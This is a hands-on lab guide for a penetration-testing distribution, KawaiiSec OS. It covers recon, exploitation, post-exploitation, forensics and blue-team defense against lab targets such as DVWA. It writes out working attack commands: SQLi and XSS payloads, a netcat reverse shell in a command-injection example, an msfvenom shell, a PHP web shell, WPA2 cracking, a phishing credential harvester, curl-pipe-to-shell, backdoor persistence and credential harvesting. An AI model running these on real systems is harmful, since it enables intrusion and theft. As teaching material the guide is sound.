# 🎯 KawaiiSec OS - Quick Start Lab Guide

Welcome to the hands-on cybersecurity lab guide! This guide provides step-by-step walkthroughs for common penetration testing scenarios using KawaiiSec OS.

## 📋 Table of Contents

1. [Lab Environment Setup](#lab-environment-setup)
2. [Reconnaissance Phase](#reconnaissance-phase)
3. [Vulnerability Assessment](#vulnerability-assessment)
4. [Exploitation Phase](#exploitation-phase)
5. [Post-Exploitation](#post-exploitation)
6. [Digital Forensics](#digital-forensics)
7. [Reverse Engineering](#reverse-engineering)
8. [Blue Team Defense](#blue-team-defense)

---

## 🚀 Lab Environment Setup

### Prerequisites Check
```bash
# Verify KawaiiSec installation
kawaiisec-help

# Check system resources
free -h              # RAM usage
df -h               # Disk space
lscpu               # CPU information
```

### Quick Lab Deployment
```bash
# Option 1: Web Application Testing Lab
launch_dvwa.sh
run_juice_shop.sh

# Option 2: Network Penetration Testing Lab
start_metasploitable3.sh

# Option 3: Full Network Topology
lab_net_topo.sh start basic

# Option 4: All-in-One Docker Lab
cd /opt/kawaiisec/labs/docker
docker-compose up -d
```

---

## 🔍 Reconnaissance Phase

### 1. Network Discovery

**Objective**: Identify live hosts and network topology

```bash
# Ping sweep to discover live hosts
nmap -sn 192.168.1.0/24

# ARP scan for local network
arp-scan -l

# Advanced network discovery
masscan -p1-65535 192.168.1.0/24 --rate=1000
```

**Expected Output:**
```
Nmap scan report for 192.168.1.1
Host is up (0.001s latency).
Nmap scan report for 192.168.1.10 (target-web-server)
Host is up (0.002s latency).
```

### 2. Port Scanning

**Objective**: Identify open ports and running services

```bash
# Quick port scan
nmap -T4 -F 192.168.1.10

# Comprehensive service detection
nmap -sV -sC -A 192.168.1.10

# Top 1000 ports with service detection
nmap -sV --top-ports 1000 192.168.1.10

# UDP scan (slower but important)
sudo nmap -sU --top-ports 100 192.168.1.10
```

**Sample Results Analysis:**
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4
80/tcp   open  http    Apache httpd 2.4.6
443/tcp  open  https   Apache httpd 2.4.6
3306/tcp open  mysql   MySQL 5.7.33
```

### 3. Service Enumeration

**Web Services (HTTP/HTTPS):**
```bash
# Directory enumeration
gobuster dir -u http://192.168.1.10 -w /usr/share/wordlists/dirb/common.txt

# Advanced directory bruteforcing
dirbuster -u http://192.168.1.10 -l /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Web vulnerability scanning
nikto -h http://192.168.1.10

# Technology fingerprinting
whatweb http://192.168.1.10
```

**SSH Services:**
```bash
# SSH version detection
nmap -p 22 --script ssh-hostkey,ssh-auth-methods 192.168.1.10

# SSH user enumeration (if vulnerable)
use auxiliary/scanner/ssh/ssh_enumusers
```

**Database Services:**
```bash
# MySQL enumeration
nmap -p 3306 --script mysql-info,mysql-empty-password 192.168.1.10

# PostgreSQL enumeration
nmap -p 5432 --script pgsql-brute 192.168.1.10
```

### 4. OSINT Gathering

**Domain Reconnaissance:**
```bash
# Subdomain enumeration
sublist3r -d target-domain.com

# Email harvesting
theharvester -d target-domain.com -b google,bing,yahoo

# Advanced OSINT with Recon-ng
recon-ng
[recon-ng][default] > workspaces create target_domain
[recon-ng][target_domain] > modules load recon/domains-hosts/google_site_web
```

---

## 🔍 Vulnerability Assessment

### 1. Web Application Testing

**DVWA Lab Setup:**
```bash
# Start DVWA
launch_dvwa.sh

# Access at http://localhost:8080
# Login: admin/password
# Set security level to "Low" for learning
```

**SQL Injection Testing:**
```bash
# Manual testing
# Navigate to SQL Injection page
# Test payload: ' OR 1=1-- 

# Automated testing with SQLMap
sqlmap -u "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=YOUR_SESSION_ID; security=low" \
  --dbs

# Extract database information
sqlmap -u "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=YOUR_SESSION_ID; security=low" \
  -D dvwa --tables
```

**Cross-Site Scripting (XSS):**
```bash
# Test payloads:
<script>alert('XSS')</script>
<img src="x" onerror="alert('XSS')">
javascript:alert('XSS')

# Advanced XSS with Dalfox
dalfox url http://localhost:8080/vulnerabilities/xss_r/?name=test
```

**Command Injection:**
```bash
# Test payloads:
; ls -la
&& whoami
| cat /etc/passwd

# Reverse shell payload:
; nc -e /bin/bash 192.168.1.100 4444
```

### 2. Network Vulnerability Scanning

**OpenVAS Setup and Scan:**
```bash
# Start OpenVAS
sudo openvas-start

# Access web interface at https://localhost:9392
# Default credentials: admin/admin

# Create new task targeting 192.168.1.10
# Run comprehensive scan
```

**Nmap Vulnerability Scripts:**
```bash
# Run vulnerability detection scripts
nmap --script vuln 192.168.1.10

# Specific CVE checks
nmap --script http-vuln-cve2017-5638 192.168.1.10

# SMB vulnerabilities
nmap --script smb-vuln-* 192.168.1.10
```

### 3. Wireless Security Assessment

**Monitor Mode Setup:**
```bash
# Enable monitor mode
sudo airmon-ng start wlan0

# Check for monitor interface
iwconfig
```

**Network Discovery:**
```bash
# Scan for wireless networks
sudo airodump-ng wlan0mon

# Target specific network
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
```

**WPA2 Cracking:**
```bash
# Capture handshake
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan0mon

# Deauth clients to force handshake
sudo aireplay-ng -0 2 -a AA:BB:CC:DD:EE:FF wlan0mon

# Crack with wordlist
aircrack-ng handshake-01.cap -w /usr/share/wordlists/rockyou.txt
```

---

## 💥 Exploitation Phase

### 1. Metasploit Framework

**Environment Setup:**
```bash
# Start Metasploit
msfconsole

# Initialize workspace
workspace -a kawaiisec_lab
```

**Web Application Exploitation:**
```bash
# Search for web exploits
search type:exploit platform:php

# Example: PHP file upload vulnerability
use exploit/multi/php/upload_exec
set RHOSTS 192.168.1.10
set TARGETURI /vulnerabilities/upload/
exploit
```

**Network Service Exploitation:**
```bash
# SMB exploitation
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.10
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.100
exploit

# SSH bruteforce
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.10
set USERNAME admin
set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
run
```

### 2. Manual Exploitation

**Reverse Shell Creation:**
```bash
# Generate payload
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf > shell.elf

# Setup listener
nc -lvnp 4444

# Upload and execute payload on target
```

**Web Shell Upload:**
```bash
# Create PHP web shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Upload via vulnerable upload functionality
# Access: http://target/uploads/shell.php?cmd=whoami
```

### 3. Social Engineering

**Phishing with SET:**
```bash
# Start Social Engineer Toolkit
setoolkit

# Choose attack vector:
# 1) Social-Engineering Attacks
# 2) Website Attack Vectors
# 3) Credential Harvester Attack Method
# 2) Site Cloner

# Clone legitimate login page
# Set up listener for credentials
```

---

## 🔓 Post-Exploitation

### 1. System Enumeration

**Linux Target:**
```bash
# System information
uname -a
cat /etc/passwd
cat /etc/shadow
ps aux
netstat -tulpn

# Find SUID binaries
find / -perm -4000 2>/dev/null

# Check for writable directories
find / -writable -type d 2>/dev/null
```

**Windows Target:**
```powershell
# System information
systeminfo
whoami /priv
net user
net localgroup administrators

# Service enumeration
sc query
wmic service list brief

# Network connections
netstat -ano
```

### 2. Privilege Escalation

**Linux Privilege Escalation:**
```bash
# LinPEAS automated enumeration
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Manual checks
sudo -l                    # Check sudo permissions
cat /etc/crontab          # Check cron jobs
find / -name "*.conf" 2>/dev/null | grep -E "(apache|nginx|mysql)"
```

**Windows Privilege Escalation:**
```powershell
# WinPEAS enumeration
.\winPEAS.exe

# Manual checks
whoami /priv
net localgroup
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

### 3. Persistence

**Linux Persistence:**
```bash
# Add SSH key
mkdir ~/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2E..." >> ~/.ssh/authorized_keys

# Cron job persistence
echo "*/5 * * * * /tmp/backdoor.sh" | crontab -

# Service persistence
cp /tmp/backdoor /usr/local/bin/
systemctl enable backdoor.service
```

**Windows Persistence:**
```powershell
# Registry persistence
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Backdoor" /t REG_SZ /d "C:\temp\backdoor.exe"

# Service persistence
sc create backdoor binpath= "C:\temp\backdoor.exe"
sc config backdoor start= auto
```

### 4. Lateral Movement

**Network Scanning from Compromised Host:**
```bash
# Internal network discovery
for i in {1..254}; do ping -c 1 192.168.1.$i | grep "bytes from" | cut -d " " -f 4 | cut -d ":" -f 1; done

# Port scanning
nc -zv 192.168.1.20 1-1000 2>&1 | grep succeeded
```

**Credential Harvesting:**
```bash
# Linux password hashes
cat /etc/shadow

# Browser saved passwords
ls ~/.mozilla/firefox/*/logins.json
ls ~/.config/google-chrome/Default/Login\ Data

# Configuration files with passwords
grep -r "password" /etc/ 2>/dev/null
```

---

## 🔬 Digital Forensics

### 1. Disk Analysis

**Create Forensic Image:**
```bash
# Create bit-by-bit copy
dd if=/dev/sdb of=/forensics/evidence.img bs=4096 conv=noerror,sync

# Verify integrity
md5sum /dev/sdb > /forensics/original.md5
md5sum /forensics/evidence.img > /forensics/image.md5
```

**Mount and Analyze:**
```bash
# Mount read-only
mkdir /mnt/evidence
mount -o ro,loop /forensics/evidence.img /mnt/evidence

# File system analysis
fsstat /forensics/evidence.img
fls -r /forensics/evidence.img
```

**Timeline Analysis:**
```bash
# Create timeline
fls -r -m / /forensics/evidence.img > /forensics/timeline.body
mactime -d -b /forensics/timeline.body > /forensics/timeline.csv
```

### 2. Memory Analysis

**Memory Dump Analysis with Volatility:**
```bash
# Identify memory profile
volatility -f memory.dump imageinfo

# List running processes
volatility -f memory.dump --profile=Win7SP1x64 pslist

# Network connections
volatility -f memory.dump --profile=Win7SP1x64 netscan

# Extract process memory
volatility -f memory.dump --profile=Win7SP1x64 memdump -p 1234 -D /output/

# Registry analysis
volatility -f memory.dump --profile=Win7SP1x64 hivelist
volatility -f memory.dump --profile=Win7SP1x64 printkey -K "Software\Microsoft\Windows\CurrentVersion\Run"
```

**Malware Detection:**
```bash
# Detect injected code
volatility -f memory.dump --profile=Win7SP1x64 malfind

# Check for hidden processes
volatility -f memory.dump --profile=Win7SP1x64 psxview

# Extract suspicious files
volatility -f memory.dump --profile=Win7SP1x64 dumpfiles -D /output/
```

### 3. Network Forensics

**Packet Analysis with Wireshark:**
```bash
# Start packet capture
tshark -i eth0 -w capture.pcap

# Analyze captured traffic
wireshark capture.pcap

# Command-line analysis
tshark -r capture.pcap -Y "http.request.method==POST"
tshark -r capture.pcap -Y "dns" | head -20
```

**Log Analysis:**
```bash
# Apache access logs
tail -f /var/log/apache2/access.log | grep -E "(POST|suspicious)"

# SSH authentication attempts
grep "Failed password" /var/log/auth.log

# System events
journalctl -u ssh -f
```

---

## 🔧 Reverse Engineering

### 1. Static Analysis

**Binary Information:**
```bash
# File information
file suspicious_binary
strings suspicious_binary | grep -E "(http|password|key)"
objdump -d suspicious_binary | head -50

# Hex analysis
hexdump -C suspicious_binary | head -20
xxd suspicious_binary | head -20
```

**Ghidra Analysis:**
```bash
# Start Ghidra
ghidra &

# Import binary
# Analyze → Auto Analyze
# Browse functions and decompiled code
```

### 2. Dynamic Analysis

**Debugging with GDB:**
```bash
# Start debugging
gdb ./suspicious_binary

# Set breakpoints
(gdb) break main
(gdb) break *0x401234

# Run and analyze
(gdb) run arg1 arg2
(gdb) info registers
(gdb) x/20x $rsp
```

**System Call Tracing:**
```bash
# Trace system calls
strace ./suspicious_binary

# Trace library calls
ltrace ./suspicious_binary

# Monitor file access
lsof -p $(pgrep suspicious_binary)
```

### 3. Malware Analysis

**Safe Analysis Environment:**
```bash
# Use isolated VM or container
docker run -it --rm remnux/remnux-distro

# Network isolation
iptables -A OUTPUT -j DROP
```

**Behavioral Analysis:**
```bash
# Monitor file system changes
auditctl -w /tmp -p wa

# Monitor network connections
netstat -tulpn | grep suspicious_binary

# Process monitoring
ps aux | grep suspicious_binary
```

---

## 🛡️ Blue Team Defense

### 1. SIEM Setup and Monitoring

**ELK Stack Configuration:**
```bash
# Start ELK stack
cd /opt/kawaiisec/labs/docker
docker-compose up elasticsearch kibana logstash

# Access Kibana at http://localhost:5601
```

**Log Collection:**
```bash
# Configure Filebeat
cat > /etc/filebeat/filebeat.yml << EOF
filebeat.inputs:
- type: log
  enabled: true
  paths:
    - /var/log/auth.log
    - /var/log/apache2/access.log
    - /var/log/syslog

output.logstash:
  hosts: ["localhost:5044"]
EOF

# Start Filebeat
systemctl start filebeat
```

### 2. Intrusion Detection

**Snort IDS Setup:**
```bash
# Configure Snort
sudo snort -c /etc/snort/snort.conf -i eth0 -A console

# Custom rules
echo 'alert tcp any any -> any 80 (msg:"HTTP Request"; content:"GET"; sid:1000001;)' >> /etc/snort/rules/local.rules
```

**Suricata Setup:**
```bash
# Start Suricata
suricata -c /etc/suricata/suricata.yaml -i eth0

# Monitor alerts
tail -f /var/log/suricata/fast.log
```

### 3. Threat Hunting

**OSQuery for Endpoint Monitoring:**
```bash
# Start OSQuery shell
osqueryi

# Query running processes
SELECT pid, name, cmdline FROM processes WHERE name LIKE '%suspicious%';

# Query network connections
SELECT DISTINCT remote_address, remote_port FROM process_open_sockets WHERE remote_port != 0;

# Query file modifications
SELECT target_path, action FROM file_events WHERE time > (strftime('%s','now') - 3600);
```

**IOC Detection:**
```bash
# Search for suspicious files
find / -name "*.php" -exec grep -l "eval\|base64_decode\|system" {} \;

# Check for unusual network connections
netstat -tulpn | grep -E "(ESTABLISHED|LISTEN)" | grep -v -E "(22|80|443)"

# Monitor for privilege escalation attempts
grep -i "sudo.*COMMAND" /var/log/auth.log | tail -20
```

### 4. Incident Response

**Evidence Collection:**
```bash
# Memory dump
cat /proc/kcore > /forensics/memory.dump

# Process information
ps auxf > /forensics/processes.txt
lsof > /forensics/open_files.txt

# Network state
netstat -tulpn > /forensics/network.txt
ss -tulpn > /forensics/sockets.txt

# System information
uname -a > /forensics/system_info.txt
uptime > /forensics/uptime.txt
```

**Containment Actions:**
```bash
# Block suspicious IP
iptables -A INPUT -s 192.168.1.666 -j DROP

# Kill malicious process
kill -9 $(pgrep suspicious_process)

# Isolate system
iptables -P INPUT DROP
iptables -P OUTPUT DROP
iptables -A INPUT -i lo -j ACCEPT
iptables -A OUTPUT -o lo -j ACCEPT
```

---

## 🎯 Practice Scenarios

### Scenario 1: Complete Web App Pentest
```bash
# 1. Setup
launch_dvwa.sh

# 2. Reconnaissance
nmap -sV localhost
nikto -h http://localhost:8080

# 3. Vulnerability Assessment
gobuster dir -u http://localhost:8080 -w /usr/share/wordlists/dirb/common.txt

# 4. Exploitation
sqlmap -u "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=..." --os-shell

# 5. Reporting
# Document findings and recommendations
```

### Scenario 2: Network Penetration Test
```bash
# 1. Setup
lab_net_topo.sh start basic

# 2. Network Discovery
nmap -sn 192.168.10.0/24

# 3. Service Enumeration
nmap -sV -sC 192.168.10.10

# 4. Exploitation
msfconsole -r /opt/kawaiisec/scripts/network_exploit.rc

# 5. Post-Exploitation
# Lateral movement and privilege escalation
```

### Scenario 3: Forensics Investigation
```bash
# 1. Setup
docker-compose up forensics-lab

# 2. Evidence Collection
dd if=/dev/sdb of=evidence.img

# 3. Analysis
volatility -f memory.dump imageinfo
autopsy &

# 4. Timeline Creation
fls -r evidence.img > timeline.body

# 5. Reporting
# Create detailed forensics report
```

---

## 📚 Additional Resources

### Cheat Sheets
- [Nmap Cheat Sheet](/opt/kawaiisec/docs/cheatsheets/nmap.md)
- [Metasploit Commands](/opt/kawaiisec/docs/cheatsheets/metasploit.md)
- [SQL Injection Payloads](/opt/kawaiisec/docs/cheatsheets/sqli.md)
- [Reverse Shell Commands](/opt/kawaiisec/docs/cheatsheets/reverse-shells.md)

### Video Tutorials
- Web Application Security Testing
- Network Penetration Testing
- Digital Forensics Fundamentals
- Malware Analysis Basics

### Practice Labs
- VulnHub VMs: https://vulnhub.com
- HackTheBox: https://hackthebox.eu
- TryHackMe: https://tryhackme.com
- OverTheWire: https://overthewire.org

---

## ⚠️ Important Reminders

### Ethical Guidelines
- Only test systems you own or have explicit permission to test
- Always follow responsible disclosure for vulnerabilities
- Respect privacy and confidentiality
- Use tools for legitimate security purposes only

### Legal Compliance
- Ensure compliance with local and international laws
- Obtain proper authorization before testing
- Maintain audit logs of all testing activities
- Follow your organization's security policies

### Best Practices
- Always work in isolated lab environments when learning
- Keep detailed notes and documentation
- Regularly update tools and signatures
- Backup important data before testing
- Use version control for custom scripts and payloads

---

**🌸 Happy Learning and Ethical Hacking! 🌸**

*Remember: The goal is to learn, improve security, and protect systems - not to cause harm.* 